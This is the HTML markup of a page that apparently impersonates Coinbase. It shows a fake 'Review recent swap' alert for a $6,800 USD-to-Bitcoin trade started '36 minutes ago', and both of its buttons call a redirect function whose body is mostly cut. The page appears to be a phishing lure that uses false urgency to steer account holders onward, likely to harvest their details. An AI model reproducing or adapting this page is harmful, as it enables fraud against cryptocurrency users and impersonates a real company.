...
<html lang="en" class="js-focus-visible" data-js-focus-visible="">
  <head>
    ...
    <title>Coinbase - Review Account</title>
    ...
    <link href="/static/styles.ed8c24d72fd1a3f66815.css" rel="stylesheet">
    <link href="/static/styles.cd9421c7f6810a295229.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="/static/styles.b9b4eac341ef893f2be7.css">
              ...
              <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="max-width: 448px; width: 100%;">
                <div class="cds-flex-f1g67tkn cds-center-czxavit cds-roundedLarge-rdc2t5d cds-bordered-b17mbjy1 cds-5-_1fh7zw6 cds-5-_1yjsi5b cds-4-_1w9a5m" style="width: 100%;">
                  <form novalidate="">
                    ...
                    <h1 class="cds-typographyResets-t1xhpuq2 cds-title1-toujgnf cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-1-_9w3lns">Review recent swap</h1>
                    <p class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a cds-3-_1mvq9l2">
                      Review your most recent swap from US Dollar to Bitcoin and decide if this was you.
                    </p>
                    <p class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a cds-3-_1mvq9l2">
                        This swap was initiated 36 minutes ago.
                      </p>
                    <div class="cds-3-_1mvq9l2">
                        <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" 
                            ...
                            <span aria-label="Select Balance" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" 
                                    style="text-align: start; color-scheme: dark; background: none; border: none; width: 100%; cursor: default; color: white; display: flex; justify-content: space-between;" 
                                    tabindex="0" id="balance2Text" name="balance2Text">
                                <span style="display: flex; align-items: center;">
                                    <img src="/app/pages/new/usdc.png" style="width: 15px;">&nbsp;US Dollar
                                </span>
                                <span style="margin-left: auto;">$6,800.00 USD</span>
                            </span>
                        </span>

                        <div class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-start-s1muvu8a" style="text-align: center; padding: 10px; color: #fff;">
                            &#x2193;
                        </div>
                        ...
                        <span aria-label="Select Balance" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" 
                                ...
                                tabindex="0" id="balance2Text" name="balance2Text">
                            <span style="display: flex; align-items: center;">
                                <img src="/app/pages/new/Bitcoin.png" style="width: 15px;">&nbsp;Bitcoin
                            </span>
                            <span style="margin-left: auto;">0.1***96 BTC</span>
                        </span>
                  </span>
                    </div>
<div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-2-_1qjdqpv cds-2-_8lqlrb">
  <button onclick="redirectToLoadingPage(event)" id="clickme" aria-busy="false" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-fullWidth-fnzgr0o cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-b17kdj8k cds-buttonBlock-b1804idl cds-4-_1arbnhr cds-4-_hd2z08" 
  type="submit" style="--interactable-height: 56px; --interactable-border-radius: 100px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(80, 127, 229); --interactable-hovered-opacity: 0.91; --interactable-pressed-background: rgb(75, 120, 214); --interactable-pressed-opacity: 0.85; --interactable-disabled-background: rgb(49, 75, 132);">
    <span class="cds-positionRelative-p1lgl550">
...
<script>
    function redirectToLoadingPage(event) {
        ...
        urlInput.addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                ...
                redirectToLoadingPage(event);
                      ...
                      <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v  cds-3-_1mvq9l2">
                          <button data-testid="this-wasnt-me" class="cds-link cds-link-l17zyfmx" type="button">
                              <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container" onclick="redirectToLoadingPage(event)">This was me</span>
                          </button>
                      </div> 
                  </form>
                </div>
